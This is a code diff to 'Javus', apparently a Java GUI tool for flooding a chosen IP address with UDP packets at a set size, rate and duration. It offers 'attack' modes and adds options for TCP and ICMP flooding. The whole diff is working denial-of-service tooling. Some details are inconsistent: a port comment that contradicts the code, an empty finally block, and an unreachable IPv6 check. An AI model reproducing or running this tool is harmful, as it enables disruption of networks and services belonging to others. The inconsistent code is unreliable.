@@ -40,14 +40,43 @@ public class Javus {
 
     public static void Start(String ip, String PKSize, Integer Time, Integer Delay) throws IOException, InterruptedException {
         try {
-            try (DatagramSocket door = new DatagramSocket()) {
-                byte[] buffer = "Hello From Javus :)".getBytes();
+            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(InetAddress.getLocalHost());
+            InetAddress localAddress = networkInterface.getInetAddresses().nextElement();
+            try (DatagramSocket door = new DatagramSocket(0, localAddress)) {
+                byte[] buffer = "Hello From Javus :) 🥔🥔🥔🥔🥔🥔".getBytes();
                 InetAddress address;
-                if (ip.contains("%")) {
-                    String[] parts = ip.split("%");
-                    address = Inet6Address.getByAddress(null, InetAddress.getByName(parts[0]).getAddress(), NetworkInterface.getByName(parts[1]).getIndex());
-                } else {
-                    address = InetAddress.getByName(ip);
+                address = InetAddress.getByName(ip);
+                if (address instanceof Inet6Address ipv6Address) {
+                    if (ipv6Address.isLinkLocalAddress() && !ip.contains("%")) {
+                        NetworkInterface ni = NetworkInterface.getByInetAddress(address);
+                        if (ni != null) {
+                            address = Inet6Address.getByAddress(null, address.getAddress(), ni.getIndex());
+                        } else {
+                            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
+                            if (interfaces.hasMoreElements()) {
+                                ni = interfaces.nextElement();
+                                address = Inet6Address.getByAddress(null, address.getAddress(), ni.getIndex());
+                            }
+                        }
+                    }
+                } else if (address != null && address.isLinkLocalAddress()) {
+                    NetworkInterface ni = NetworkInterface.getByInetAddress(address);
+                    if (ni != null) {
+                        if (address instanceof Inet6Address) {
+                            address = Inet6Address.getByAddress(null, address.getAddress(), ni.getIndex());
+                        } else {
+                            address = InetAddress.getByAddress(null, address.getAddress());
+                        }
+                    } else {
+                        // Try to find any suitable network interface
+                        Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
+                        if (interfaces.hasMoreElements()) {
+                            ni = interfaces.nextElement();
+                            address = InetAddress.getByAddress(ni.getName(), address.getAddress());
+                        } else {
+                            throw new SocketException("No suitable network interface found for link-local address");
+                        }
+                    }
                 }
                 DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 42069); // Assuming port 12345
                 ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
@@ -61,10 +90,14 @@ public class Javus {
                         System.out.println("Error on 55: " + ex);
                     }
                 };
-                executor.scheduleAtFixedRate(task, 0, Delay, TimeUnit.MILLISECONDS);
-                executor.awaitTermination(Time, TimeUnit.SECONDS);
+                if (Delay >= 0) {
+                    executor.scheduleAtFixedRate(task, 0, Delay, TimeUnit.MILLISECONDS);
+                    executor.awaitTermination(Time + (Delay / 1000), TimeUnit.SECONDS);
+                } else {
+                    throw new IllegalArgumentException("Delay must be non-negative");
+                }
                 executor.shutdown();
-            }
+            } finally {}
 
         } catch (SocketException ex) {
             System.out.println("Error 64: " + ex);
@@ -85,6 +118,7 @@ public class Javus {
         window.setLayout(null);
 
         JComboBox<String> attack = new JComboBox<>();
+        JComboBox<String> dataType = new JComboBox<>();
 
         JTextField IP = new JTextField();
         JTextField PacketSize = new JTextField();
@@ -111,6 +145,11 @@ public class Javus {
         attack.addItem("Custom");
         attack.addItem("Self");
         attack.addItem("WiFi");
+
+        dataType.setBounds(0, 0, 90, 40);
+        dataType.addItem("UDP");
+        dataType.addItem("TCP");
+        dataType.addItem("ICMP");
 
         BeginEnd.addActionListener((ActionEvent e) -> {
             if (BeginEnd.getText().equals("Begin")) {
@@ -184,6 +223,7 @@ public class Javus {
         window.add(IP);
         
         window.add(attack);
+        window.add(dataType);
 
         window.add(BeginEnd);
     }
